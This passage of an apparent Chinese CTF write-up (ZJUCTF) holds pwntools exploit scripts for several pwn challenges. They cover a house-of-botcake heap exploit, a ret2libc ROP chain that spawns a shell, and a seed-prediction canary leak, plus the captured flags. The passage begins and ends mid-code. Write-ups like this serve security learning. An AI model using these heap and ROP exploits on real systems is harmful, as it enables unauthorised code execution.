p.sendlineafter(<span class="string">&quot;Input size of shipping address:\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input your address:\n&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index of box to check:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Your choice: &quot;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Input index of box to send:\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./cakebot&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">44907</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x0000000000001346)&quot;)</span></span><br><span class="line"><span class="comment"># chunk0 index0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk0 index0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># chunk1 index1</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x20</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;This box will be sent to:\n\x00&quot;</span>)</span><br><span class="line">libc_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x203d0a</span></span><br><span class="line">info(<span class="string">f&#x27;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">0x110</span>-<span class="number">6</span>)</span><br><span class="line">heap_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) * <span class="number">0x1000</span></span><br><span class="line">info(<span class="string">f&#x27;heap_addr: <span class="subst">&#123;<span class="built_in">hex</span>(heap_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">environ_addr = (libc_addr + <span class="number">0x20ad58</span> - <span class="number">0x38</span>) ^ (heap_addr // <span class="number">0x1000</span>)</span><br><span class="line">info(<span class="string">f&#x27;environ_addr: <span class="subst">&#123;<span class="built_in">hex</span>(environ_addr)&#125;</span>&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment"># house of botcake tcache attack to leak stack_addr</span></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x20</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, environ_addr))</span><br><span class="line">add(<span class="number">15</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">14</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">show(<span class="number">14</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;This box will be sent to:\n\x00&quot;</span>)</span><br><span class="line">p.recv(<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">stack_addr = (u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x28</span>-<span class="number">0x120</span>) ^ (heap_addr // <span class="number">0x1000</span> + <span class="number">1</span>)</span><br><span class="line">info(<span class="string">f&quot;stack_addr: <span class="subst">&#123;<span class="built_in">hex</span>(stack_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># house of botcake to modify rbp+8</span></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">11</span>, <span class="number">0x30</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">6</span>)</span><br><span class="line">delete(<span class="number">9</span>)</span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"><span class="comment"># add(6, 0x100, flat(b&#x27;&#x27;))</span></span><br><span class="line">delete(<span class="number">10</span>)</span><br><span class="line">add(<span class="number">9</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, stack_addr))</span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x200</span>, flat(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>, <span class="number">0x110</span>, <span class="number">0x110</span>, stack_addr))</span><br><span class="line">add(<span class="number">10</span>, <span class="number">0x100</span>, flat(<span class="string">b&#x27;&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">pop_rdi_rbp = <span class="number">0x000000000002a873</span>+libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x00000000001cb42f</span>+libc_addr</span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_addr</span><br><span class="line"></span><br><span class="line">payload = flat(<span class="number">0</span>, pop_rdi_rbp, bin_sh_addr, <span class="number">0</span>, system_addr)</span><br><span class="line">add(<span class="number">13</span>, <span class="number">0x100</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>获取到flag: <code>ZJUCTF&#123;C4ke_8ot?_8otC4ke!&#125;</code></p>
<h4 id="easy-rop"><a href="#easy-rop" class="headerlink" title="easy rop"></a>easy rop</h4><p>存在栈溢出，通过泄漏libc和程序基址后获取shell。中间返回到main函数时需要考虑栈平衡，不过由于payload长度不够，所以最后将返回地址改为start函数，得解。</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./rop&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &quot;b *$rebase(0x00000000000008A9)&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">46799</span>)</span><br><span class="line"><span class="comment"># ret2libc</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">printf_plt = elf.plt[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">read_addr = <span class="number">0x00000000000007da</span></span><br><span class="line">main_addr = <span class="number">0x00000000000008AB</span></span><br><span class="line">start_addr = <span class="number">0x00000000000006D0</span></span><br><span class="line"><span class="comment"># read_addr = int(input(), 16)</span></span><br><span class="line"><span class="comment"># 可以通过printf泄漏基址</span></span><br><span class="line">payload = flat(<span class="string">&#x27;SJTU&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, p16(start_addr))</span><br><span class="line">p.sendafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x6d0</span></span><br><span class="line">info(<span class="string">f&#x27;base_addr: <span class="subst">&#123;<span class="built_in">hex</span>(base_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">assert</span> base_addr &gt;= <span class="number">0x1000000</span></span><br><span class="line"><span class="comment"># 泄漏libc</span></span><br><span class="line">pop_rdi = <span class="number">0x963</span>+base_addr</span><br><span class="line">read_addr = <span class="number">0x7da</span>+base_addr</span><br><span class="line">start_addr += base_addr</span><br><span class="line">printf_got += base_addr</span><br><span class="line">printf_plt += base_addr</span><br><span class="line">ret_addr = <span class="number">0x8fb</span>+base_addr</span><br><span class="line">payload = flat(<span class="string">&quot;SJTU&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, pop_rdi, printf_got, ret_addr, printf_plt, start_addr)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line">p.recvline()</span><br><span class="line"></span><br><span class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">info(<span class="string">f&#x27;printf_addr: <span class="subst">&#123;<span class="built_in">hex</span>(printf_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># libc_addr = printf_addr-(0x7fb0075b7e80- 0x7fb007553000)</span></span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;printf&quot;</span>, printf_addr)</span><br><span class="line">libc_addr = printf_addr-<span class="number">0x64e40</span></span><br><span class="line">info(<span class="string">f&#x27;libc_addr: <span class="subst">&#123;<span class="built_in">hex</span>(libc_addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造system()</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.27.so&#x27;)</span></span><br><span class="line">system_addr = <span class="number">0x4f420</span> + libc_addr</span><br><span class="line">bin_sh_addr = <span class="number">0x1b3d88</span> + libc_addr</span><br><span class="line"><span class="comment"># system_addr = libc_addr+libc.dump(&quot;system&quot;)</span></span><br><span class="line"><span class="comment"># bin_sh_addr = libc_addr+libc.dump(&quot;str_bin_sh&quot;)</span></span><br><span class="line">payload = flat(<span class="string">&quot;SJTU&quot;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x30</span>-<span class="number">4</span>), <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x8</span>, pop_rdi, bin_sh_addr, ret_addr, system_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Print Your name please: &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>得到flag: <code>ZJUCTF&#123;@n_1a$y_R0p_cHalL_1N_x64|A7hdJk5wN7&#125;</code></p>
<h3 id="大-A-口算"><a href="#大-A-口算" class="headerlink" title="大 A 口算"></a>大 A 口算</h3><p>首先通过已知种子为2010年的同一时间，可以预测出所有题目。</p>
<p>漏洞点</p>
<img src="/posts/dc126860/image-20241022210822484.png" class="" title="image-20241022210822484">

<p>通过每次写满s变量，可以每次增加1字节，从而达到泄漏canary，partial write跳转到打印flag的函数即可。</p>
<p><code>exp</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>, terminal=[<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取当前时间</span></span><br><span class="line">current_time = datetime.now()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印当前时间及时间戳</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间:&quot;</span>, current_time)</span><br><span class="line">current_timestamp = <span class="built_in">int</span>(time.mktime(current_time.timetuple()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;当前时间戳:&quot;</span>, current_timestamp)</span><br><span class="line"><span class="comment"># 修改年份为 2010 年</span></span><br><span class="line">modified_time = current_time.replace(year=<span class="number">2010</span>)</span><br><span class="line"><span class="comment"># 获取修改后年份的时间戳</span></span><br><span class="line">timestamp = <span class="built_in">int</span>(time.mktime(modified_time.timetuple()))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">38911</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./arithmetic&#x27;)</span></span><br><span class="line"><span class="comment"># gdb.attach(p, &#x27;b *$rebase(0x0000000000001B36)&#x27;)</span></span><br><span class="line">seed = timestamp</span><br><span class="line"><span class="comment"># seed = current_timestamp</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Input your choice:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># 推测出正确的timestamp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># guess = random.randint(0, 2)</span></span><br><span class="line">guess = <span class="number">0</span></span><br><span class="line">info(<span class="string">f&quot;guess: <span class="subst">&#123;guess&#125;</span>&quot;</span>)</span><br><span class="line">info(<span class="string">f&quot;seed+guess: <span class="subst">&#123;seed+guess&#125;</span>&quot;</span>)</span><br><span class="line">seed_correct = <span class="literal">False</span></span><br><span class="line">libc.srand(seed+guess)</span><br><span class="line"><span class="comment"># 生成一个随机数（类似rand()）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_challenge</span>():</span><br><span class="line">    v1 = libc.rand() % <span class="number">20</span> + <span class="number">1</span>  <span class="comment"># C的rand()通常生成0到RAND_MAX之间的值，RAND_MAX = 2^31-1</span></span><br><span class="line">    v2 = libc.rand() % <span class="number">20</span> + <span class="number">1</span></span><br><span class="line">    <span class="comment"># info(f&quot;question:\t &#123;v1&#125; ? &#123;v2&#125; &quot;)</span></span><br><span class="line">    <span class="keyword">return</span> v1, v2</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;\nNow guess the answer, I&#x27;ll correct your answer:&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v1 = [<span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line">    v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">info(<span class="string">f&#x27;answer: <span class="subst">&#123;answer&#125;</span>&#x27;</span>)</span><br><span class="line">p.send(answer)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">score = <span class="built_in">int</span>(p.recv(<span class="number">3</span>).decode(encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">info(score)</span><br><span class="line"><span class="keyword">if</span> score == <span class="number">256</span>:</span><br><span class="line">    seed_correct = <span class="literal">True</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&quot;guess in not correct&quot;</span>)</span><br><span class="line"></span><br><span class="line">answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">    <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">        answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 3: 增加size值 256-&gt;257</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak canary</span></span><br><span class="line">p.recvuntil(answer)</span><br><span class="line">canary = u64(p.recv(<span class="number">8</span>)) - <span class="number">0xa</span></span><br><span class="line">info(<span class="string">f&quot;canary: <span class="subst">&#123;<span class="built_in">hex</span>(canary)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># step 4: leak base_addr</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">277</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line">    <span class="comment"># size: 257-&gt;258</span></span><br><span class="line">    answer = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">277</span>+j):</span><br><span class="line">        v1[<span class="number">0</span>], v1[<span class="number">1</span>] = generate_challenge()</span><br><span class="line">        <span class="keyword">if</span> v1[<span class="number">0</span>] == v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;=&#x27;</span></span><br><span class="line">        <span class="keyword">elif</span> v1[<span class="number">0</span>] &gt; v1[<span class="number">1</span>]:</span><br><span class="line">            answer += <span class="string">&#x27;&gt;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            answer += <span class="string">&#x27;&lt;&#x27;</span></span><br><span class="line">    info(<span class="string">f&quot;answer: <span class="subst">&#123;answer&#125;</span>&quot;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Now guess the answer, I&#x27;ll correct your answer:&quot;</span>, answer)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nchecking answers...\n&quot;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&quot;\nOK! &quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(answer)</span><br><span class="line">p.recvline()</span><br><span class="line">base_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span 